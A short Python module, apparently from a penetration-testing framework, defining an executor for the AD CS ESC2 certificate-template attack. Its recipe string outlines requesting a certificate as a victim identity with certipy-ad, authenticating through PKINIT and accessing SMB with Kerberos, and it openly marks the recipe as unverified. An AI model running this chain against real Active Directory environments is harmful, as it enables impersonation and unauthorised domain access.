"""ADCS-ESC2: Any-Purpose / no-EKU template -> PKINIT -> ticket-backed access.

UNVERIFIED ASSUMPTION: this follows ESC1's request recipe with an ESC2 template.
The template's unrestricted purposes must allow the requested identity; issuance
alone is insufficient. Only successful PKINIT AND SMB access prove use. Certipy
output markers are assumptions documented in ``_adcs_request_common``; this
recipe has not been lab-proven. Rollback destroys issued PFX/cache material.
"""
from ._adcs_request_common import ADCSRequestExecutor


class ADCSESC2Executor(ADCSRequestExecutor):
    technique = "ADCS-ESC2"
    template_default = "ESC2"
    template_description = "Any-Purpose / no-EKU certificate template to request."
    recipe_ref = ("UNVERIFIED ADCS-ESC2: certipy-ad req -template <ESC2> -upn <victim> "
                  "-> auth (PKINIT) -> nxc smb -k; verified key-material destruction")
